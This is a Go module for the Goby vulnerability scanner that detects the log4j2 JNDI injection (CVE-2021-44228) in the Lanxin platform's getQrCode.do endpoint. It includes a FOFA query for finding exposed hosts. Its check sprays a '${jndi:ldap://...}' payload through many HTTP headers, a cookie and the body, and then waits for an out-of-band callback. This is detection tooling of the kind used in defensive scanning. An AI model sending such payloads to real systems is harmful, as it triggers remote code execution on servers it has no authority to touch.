package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Lanxin log4j2 getQrCode.do Api Remote command execution vulnerability (CVE-2021-44228)",
    "Description": "<p>Lanxin is a full-scenario intelligent security collaboration platform dedicated to serving the party, government, military, and central enterprises.</p><p>Lanxin has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "<p>Lanxin log4j2 Remote command execution vulnerability (CVE-2021-44228)</p>",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Lanxin",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "蓝信 log4j2 getQrCode.do 接口命令执行漏洞（CVE-2021-44228）",
            "Product": "蓝信",
            "Description": "<p>蓝信，是专注服务于党政军央企的全场景智能化安全协同平台。<br></p><p>蓝信&nbsp;存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞方案，请及时关注： <a href=\"https://github.com/apache/logging-log4j2/tags\">https://github.com/apache/logging-log4j2/tags</a></p><p></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Lanxin 存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Lanxin log4j2 getQrCode.do Api Remote command execution vulnerability (CVE-2021-44228)",
            "Product": "Lanxin",
            "Description": "<p>Lanxin is a full-scenario intelligent security collaboration platform dedicated to serving the party, government, military, and central enterprises.</p><p>Lanxin has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\" target=\"_blank\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Lanxin log4j2 Remote command execution vulnerability (CVE-2021-44228)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title==\"蓝信-企业级安全移动工作平台\" || title==\"蓝信\" || body=\"请使用蓝信扫描二维码登录\"",
    "GobyQuery": "title==\"蓝信-企业级安全移动工作平台\" || title==\"蓝信\" || body=\"请使用蓝信扫描二维码登录\"",
    "Author": "2272759195@qq.com",
    "Homepage": "https://www.lanxin.cn/",
    "DisclosureDate": "2022-01-10",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10251"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("2${jndi:ldap://%s}", checkUrl)
			cmd = url.QueryEscape(cmd)
			cfg := httpclient.NewPostRequestConfig("/pc/getQrCode.do")
			cfg.Header.Store("Content-Type", cmd)
			cfg.Header.Store("Cookie", "route="+cmd)
			cfg.Header.Store("SESSION", cmd)
			cfg.Header.Store("X-Requested-With", cmd)
			cfg.Header.Store("User-Agent", cmd)
			cfg.Header.Store("X-Client-IP", cmd)
			cfg.Header.Store("X-Forwarded-For", cmd)
			cfg.Header.Store("X-Api-Version", cmd)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = "operationType=" + cmd
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		nil,
	))
}
